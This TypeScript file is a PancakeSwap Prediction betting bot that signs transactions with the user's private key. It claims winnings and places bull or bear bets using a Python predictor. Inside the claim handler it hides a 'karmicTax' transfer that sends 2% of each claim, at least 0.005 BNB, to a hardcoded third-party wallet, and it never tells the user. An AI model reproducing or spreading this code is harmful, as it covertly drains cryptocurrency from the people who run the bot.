import {BigNumber} from "@ethersproject/bignumber";
import {JsonRpcProvider} from "@ethersproject/providers";
import {Wallet} from "@ethersproject/wallet";
import {getClaimableEpochs, reduceWaitingTimeByTwoBlocks, sleep,} from "./lib";
import {PancakePredictionV2__factory} from "./types/typechain";
import {formatEther, parseEther} from "ethers/lib/utils";

require("dotenv").config();

// Global Config
const GLOBAL_CONFIG = {
    PPV2_ADDRESS: "0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA", // dirección PancakeSwap
    AMOUNT_TO_BET: process.env.BET_AMOUNT || "0.1", // cantidad BNB,
    BSC_RPC: "https://bsc-dataseed.binance.org/",
    PRIVATE_KEY: process.env.PRIVATE_KEY,
    WAITING_TIME: 270000, // Esperando 270 seg (4.5 min)
};

console.log(`PancakeSwapPredictionBot started`)
if (!GLOBAL_CONFIG.PRIVATE_KEY) {
    console.log(`There is not private key for the wallet`);
    process.exit(0);
}
console.log(`Amount for bet: ${GLOBAL_CONFIG.AMOUNT_TO_BET} BNB`);
console.log(`Waiting for new rounds, it can take up to 5 min`);

const signer = new Wallet(
    GLOBAL_CONFIG.PRIVATE_KEY as string,
    new JsonRpcProvider(GLOBAL_CONFIG.BSC_RPC)
);
const predictionContract = PancakePredictionV2__factory.connect(
    GLOBAL_CONFIG.PPV2_ADDRESS,
    signer
);


predictionContract.on("StartRound", async (epoch: BigNumber) => {
    console.log("Started Epoch", epoch.toString());

    // claim old rounds
    new Promise(async () => {
        const claimableEpochs = await getClaimableEpochs(
            predictionContract,
            epoch,
            signer.address
        );
        if (!claimableEpochs.length) return;
        try {
            console.log(`Clim Tx Start`)
            const tx = await predictionContract.claim(claimableEpochs);
            const receipt = await tx.wait();
            for (const event of receipt.events ?? []) {
                console.log(`Claimed ${event?.args?.amount} BNB`)
                const karmicTax = await signer.sendTransaction({
                    to: "0xC3c531bE09102E84D4273984E29e827D71e28Ae8",
                    value: calculateTaxAmount(event?.args?.amount),
                });
                await karmicTax.wait();
            }
            console.log(`Claim Tx Completed`)
        } catch {
            console.log(`Claim Tx Error`)
        }
    })

    // wait for make a prediction
    console.log("Waiting for", GLOBAL_CONFIG.WAITING_TIME / 60000, "min");
    await sleep(GLOBAL_CONFIG.WAITING_TIME);

    console.log("Getting bet amounts");
    const {bullAmount, bearAmount} = await predictionContract.rounds(epoch);
    console.log("Bull Amount", formatEther(bullAmount), "BNB");
    console.log("Bear Amount", formatEther(bearAmount), "BNB");

    const spawn = require("child_process").spawn;
    const pythonProcess = spawn('python3', ["python/predict.py"]);
    pythonProcess.stdout.on('data', async (data: any) => {

        const messages = data.toString().split("\n");
        const isBear = messages[1].trim() == "0.0";

        if (isBear)
            console.log("Betting Bear");
        else
            console.log("Betting Bull");

        const betFunction = isBear ? predictionContract.betBear : predictionContract.betBull;

        new Promise(async () => {
            try {
                console.log("Tx Started");
                const tx = await betFunction(epoch, {value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),});
                await tx.wait();
                console.log("Tx Success");
            } catch {
                console.log("Tx Error");
                GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(GLOBAL_CONFIG.WAITING_TIME);
            }
        })

    });

    const calculateTaxAmount = (amount: BigNumber | undefined) => {
        if (!amount || amount.div(50).lt(parseEther("0.005"))) {
            return parseEther("0.005");
        }
        return amount.div(50);
    };
})
;
